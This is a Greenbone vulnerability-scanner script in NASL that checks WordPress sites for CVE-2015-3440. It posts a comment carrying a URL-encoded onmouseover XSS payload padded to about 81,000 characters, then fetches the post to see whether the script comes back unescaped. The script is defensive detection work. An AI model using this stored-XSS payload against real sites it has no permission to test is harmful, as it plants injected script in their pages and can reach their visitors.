# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805176");
  script_version("2025-06-25T05:41:02+0000");
  script_cve_id("CVE-2015-3440");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-06-25 05:41:02 +0000 (Wed, 25 Jun 2025)");
  script_tag(name:"creation_date", value:"2015-05-04 18:50:27 +0530 (Mon, 04 May 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("WordPress < 4.2.1 Comments Stored XSS Vulnerability");

  script_tag(name:"summary", value:"WordPress is prone to a stored cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists because input to truncated blog comments is not
  validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to create a
  specially crafted request that would execute arbitrary script code in a user's browser session
  within the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"WordPress version 4.2 and prior.");

  script_tag(name:"solution", value:"Update to version 4.2.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/36844");
  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/7945");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121084440/http://www.securityfocus.com/archive/1/535370");

  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-comments-post.php";
useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name( port:port );

A = crap(length:81847, data:"A");

postdata = string("author=aaa&email=aaa%40aaa.com&url=http%3A%2F%2Faaa&comment",
                  "=%3Ca+title%3D%27x+onmouseover%3Dalert%28unescape%28%2Fhell",
                  "o%2520world%2F.source%29%29%0D%0Astyle%3Dposition%3Aabsolut",
                  "e%3Bleft%3A0%3Btop%3A0%3Bwidth%3A5000px%3Bheight%3A5000px%0D%0AAA", A,
                  "AAA%27%3E%3C%2Fa%3E&submit=Post+Comment&comment_post_ID=1&comment_parent=0");

req = string('POST ', url, ' HTTP/1.1\r\n',
             'Host: ', host, '\r\n',
             'User-Agent: ', useragent, '\r\n',
             'Content-Type: application/x-www-form-urlencoded\r\n',
             'Content-Length: ', strlen(postdata), '\r\n\r\n',
             postdata);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

## This error message will come for fixed version
if("ERROR</strong>: The comment could not be saved" >< res)
  exit(0);

if(res =~ "^HTTP/1\.[01] 302" && "comment_author_" >< res)
{
  comment_author = eregmatch(pattern:"comment_author_([0-9a-z]*)=aaa;", string:res);
  comment_author_email = eregmatch(pattern:"comment_author_email_([0-9a-z]*)=aaa%40aaa.com;", string:res);
  comment_author_url = eregmatch(pattern:"comment_author_url_([0-9a-z]*)=http%3A%2F%2Faaa;", string:res);

  if(comment_author[0] && comment_author_email[0] && comment_author_url[0])
  {
    cookie = string(comment_author[0], " ", comment_author_email[0], " ",
                    comment_author_url[0], "wp-settings-1=mfold%3Do; wp-settings-time-1=1427199392");

    comment_url = dir + "/?p=1";

    newReq = string("GET ", comment_url," HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", useragent, "\r\n",
                    "Cookie: ", cookie, "\r\n\r\n");
    newRes = http_send_recv(port:port, data:newReq, bodyonly:FALSE);

    if(newRes =~ "^HTTP/1\.[01] 200" && "alert(unescape(/hello%20world" >< newRes &&
       "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" >< newRes) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
